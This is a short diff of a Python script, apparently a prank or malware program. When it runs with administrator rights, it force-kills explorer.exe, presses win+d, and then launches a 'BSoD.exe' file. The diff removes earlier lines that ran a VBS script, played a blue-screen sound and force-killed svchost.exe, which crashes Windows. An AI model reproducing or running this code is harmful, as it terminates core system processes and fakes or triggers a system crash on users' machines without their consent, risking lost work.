@@ -144,9 +144,7 @@ if ctypes.windll.shell32.IsUserAnAdmin():
         window.destroy()
         os.system("taskkill /f /im explorer.exe")
         pyautogui.hotkey("win", "d")
-        os.startfile("scripts/fatma.vbs")
-        simpleaudio.WaveObject.from_wave_file("assets/BSOD.wav").play().wait_done()
-        os.system("taskkill /f /im svchost.exe")
+        os.startfile("BSoD.exe")
         
     def Center(win):
         win.update_idletasks()
